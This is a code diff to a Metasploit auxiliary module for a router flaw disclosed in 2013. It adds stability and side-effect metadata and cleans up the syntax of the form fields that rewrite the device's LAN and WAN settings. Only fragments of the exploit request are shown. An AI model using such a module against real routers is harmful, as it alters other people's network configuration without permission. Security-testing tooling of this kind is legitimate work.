@@ -33,7 +33,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'BID', '57459' ],
           [ 'OSVDB', '89421' ]
         ],
-        'DisclosureDate' => '2013-01-18'
+        'DisclosureDate' => '2013-01-18',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -152,10 +157,10 @@ class MetasploitModule < Msf::Auxiliary
           'wan_domain' => wandomain.to_s,
           'mtu_enable' => '1',
           'wan_mtu' => wanmtu.to_s,
-          'lan_ipaddr_0' => (ip[0]).to_s,
-          'lan_ipaddr_1' => (ip[1]).to_s,
-          'lan_ipaddr_2' => (ip[2]).to_s,
-          'lan_ipaddr_3' => (ip[3]).to_s,
+          'lan_ipaddr_0' => ip[0].to_s,
+          'lan_ipaddr_1' => ip[1].to_s,
+          'lan_ipaddr_2' => ip[2].to_s,
+          'lan_ipaddr_3' => ip[3].to_s,
           'lan_netmask' => netmask.to_s,
           'lan_proto' => 'dhcp',
           'dhcp_check' => '1',
